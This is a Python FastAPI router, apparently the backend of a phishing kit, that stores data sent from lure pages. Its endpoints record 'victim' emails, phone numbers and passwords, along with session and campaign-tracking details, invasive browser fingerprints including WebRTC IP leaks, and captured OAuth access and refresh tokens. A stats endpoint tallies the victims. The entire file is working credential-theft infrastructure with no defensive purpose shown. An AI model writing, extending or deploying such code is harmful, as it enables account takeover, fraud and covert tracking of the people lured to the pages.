"""
Capture Router
Victim data capture, session tracking, and device fingerprinting
"""

import logging
import hashlib
from datetime import datetime, timezone
from typing import Dict, Any, Optional

from fastapi import APIRouter, HTTPException, status, Request, Depends
from pydantic import BaseModel, Field

from api.capture.session_capture import SessionCaptureEngine
from api.capture.fingerprint import FingerprintEngine
from api.capture.oauth_capture import OAuthTokenCapture
from api.auth.jwt_handler import JWTHandler
from database.connection import get_database_connection

logger = logging.getLogger(__name__)

router = APIRouter()

# Initialize managers
session_capture_manager = SessionCaptureEngine()
fingerprint_manager = FingerprintEngine()
oauth_capture_manager = OAuthTokenCapture()
jwt_handler = JWTHandler()

# Pydantic models
class VictimCaptureRequest(BaseModel):
    email: str = Field(..., description="Victim email address")
    name: Optional[str] = Field(None, description="Victim name")
    phone: Optional[str] = Field(None, description="Victim phone number")
    password: Optional[str] = Field(None, description="Victim password")
    additional_data: Optional[Dict[str, Any]] = Field(default_factory=dict)

class SessionCaptureRequest(BaseModel):
    session_id: str
    page_url: str
    referrer: Optional[str] = None
    utm_source: Optional[str] = None
    utm_medium: Optional[str] = None
    utm_campaign: Optional[str] = None
    utm_content: Optional[str] = None
    utm_term: Optional[str] = None

class FingerprintRequest(BaseModel):
    screen_resolution: str
    color_depth: int
    timezone: str
    language: str
    platform: str
    plugins: list
    fonts: list
    canvas_signature: str
    webgl_vendor: str
    webgl_renderer: str
    audio_fingerprint: str
    webrtc_ips: list

class OAuthTokenCaptureRequest(BaseModel):
    provider: str
    access_token: str
    refresh_token: Optional[str] = None
    id_token: Optional[str] = None
    expires_in: Optional[int] = None
    scope: Optional[str] = None
    user_profile: Optional[Dict[str, Any]] = None

@router.post("/victim")
async def capture_victim_data(
    request: VictimCaptureRequest,
    http_request: Request
):
    """Capture victim data"""
    try:
        # Get client information
        client_ip = http_request.client.host
        user_agent = http_request.headers.get("user-agent", "")
        
        # Create victim record
        victim_data = {
            "email": request.email,
            "name": request.name,
            "phone": request.phone,
            "password": request.password,
            "additional_data": request.additional_data,
            "client_ip": client_ip,
            "user_agent": user_agent,
            "capture_timestamp": datetime.now(timezone.utc),
            "capture_method": "form_submission"
        }
        
        # Process victim capture
        victim_id = await session_capture_manager.process_victim_capture(victim_data)
        
        if not victim_id:
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail="Failed to process victim capture"
            )
        
        logger.info(f"Victim data captured: {request.email}")
        
        return {
            "success": True,
            "victim_id": victim_id,
            "message": "Victim data captured successfully"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Victim capture error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

@router.post("/session")
async def capture_session_data(
    request: SessionCaptureRequest,
    http_request: Request
):
    """Capture session data"""
    try:
        # Get client information
        client_ip = http_request.client.host
        user_agent = http_request.headers.get("user-agent", "")
        
        # Create session record
        session_data = {
            "session_id": request.session_id,
            "page_url": request.page_url,
            "referrer": request.referrer,
            "utm_source": request.utm_source,
            "utm_medium": request.utm_medium,
            "utm_campaign": request.utm_campaign,
            "utm_content": request.utm_content,
            "utm_term": request.utm_term,
            "client_ip": client_ip,
            "user_agent": user_agent,
            "capture_timestamp": datetime.now(timezone.utc)
        }
        
        # Process session capture
        session_record_id = await session_capture_manager.process_session_capture(session_data)
        
        if not session_record_id:
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail="Failed to process session capture"
            )
        
        logger.info(f"Session data captured: {request.session_id}")
        
        return {
            "success": True,
            "session_record_id": session_record_id,
            "message": "Session data captured successfully"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Session capture error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

@router.post("/fingerprint")
async def capture_device_fingerprint(
    request: FingerprintRequest,
    http_request: Request
):
    """Capture device fingerprint"""
    try:
        # Get client information
        client_ip = http_request.client.host
        user_agent = http_request.headers.get("user-agent", "")
        
        # Generate fingerprint ID
        fingerprint_data = {
            "screen_resolution": request.screen_resolution,
            "color_depth": request.color_depth,
            "timezone": request.timezone,
            "language": request.language,
            "platform": request.platform,
            "plugins": request.plugins,
            "fonts": request.fonts,
            "canvas_signature": request.canvas_signature,
            "webgl_vendor": request.webgl_vendor,
            "webgl_renderer": request.webgl_renderer,
            "audio_fingerprint": request.audio_fingerprint,
            "webrtc_ips": request.webrtc_ips,
            "client_ip": client_ip,
            "user_agent": user_agent,
            "capture_timestamp": datetime.now(timezone.utc)
        }
        
        # Generate unique fingerprint ID
        fingerprint_string = f"{request.canvas_signature}{request.webgl_vendor}{request.audio_fingerprint}"
        fingerprint_id = hashlib.sha256(fingerprint_string.encode()).hexdigest()[:16]
        
        # Process fingerprint capture
        result = await fingerprint_manager.process_fingerprint_data(
            None,  # session_id - có thể cần điều chỉnh
            fingerprint_data,
            client_ip
        )

        fingerprint_record_id = result.get("fingerprint_id")
        
        if not fingerprint_record_id:
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail="Failed to process fingerprint capture"
            )
        
        logger.info(f"Device fingerprint captured: {fingerprint_id}")
        
        return {
            "success": True,
            "fingerprint_id": fingerprint_id,
            "fingerprint_record_id": fingerprint_record_id,
            "message": "Device fingerprint captured successfully"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Fingerprint capture error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

@router.post("/oauth-tokens")
async def capture_oauth_tokens(
    request: OAuthTokenCaptureRequest,
    http_request: Request
):
    """Capture OAuth tokens"""
    try:
        # Get client information
        client_ip = http_request.client.host
        user_agent = http_request.headers.get("user-agent", "")
        
        # Create OAuth capture data
        oauth_data = {
            "provider": request.provider,
            "access_token": request.access_token,
            "refresh_token": request.refresh_token,
            "id_token": request.id_token,
            "expires_in": request.expires_in,
            "scope": request.scope,
            "user_profile": request.user_profile,
            "client_ip": client_ip,
            "user_agent": user_agent,
            "capture_timestamp": datetime.now(timezone.utc)
        }
        
        # Process OAuth capture
        oauth_record_id = await oauth_capture_manager.process_oauth_token_capture(oauth_data)
        
        if not oauth_record_id:
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail="Failed to process OAuth token capture"
            )
        
        logger.info(f"OAuth tokens captured for provider: {request.provider}")
        
        return {
            "success": True,
            "oauth_record_id": oauth_record_id,
            "message": "OAuth tokens captured successfully"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"OAuth token capture error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

@router.get("/stats")
async def get_capture_stats():
    """Get capture statistics"""
    try:
        # Get statistics from managers
        victim_stats = await session_capture_manager.get_capture_stats()
        session_stats = await session_capture_manager.get_session_stats()
        fingerprint_stats = await fingerprint_manager.get_fingerprint_stats()
        oauth_stats = await oauth_capture_manager.get_oauth_stats()
        
        return {
            "victims": victim_stats,
            "sessions": session_stats,
            "fingerprints": fingerprint_stats,
            "oauth_tokens": oauth_stats,
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
        
    except Exception as e:
        logger.error(f"Get capture stats error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

@router.get("/health")
async def capture_health_check():
    """Health check for capture services"""
    try:
        # Check if all capture managers are healthy
        health_status = {
            "session_capture": await session_capture_manager.health_check(),
            "fingerprint": await fingerprint_manager.health_check(),
            "oauth_capture": await oauth_capture_manager.health_check(),
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
        
        all_healthy = all(health_status.values())
        
        return {
            "status": "healthy" if all_healthy else "degraded",
            "services": health_status
        }
        
    except Exception as e:
        logger.error(f"Capture health check error: {e}")
        return {
            "status": "unhealthy",
            "error": str(e),
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
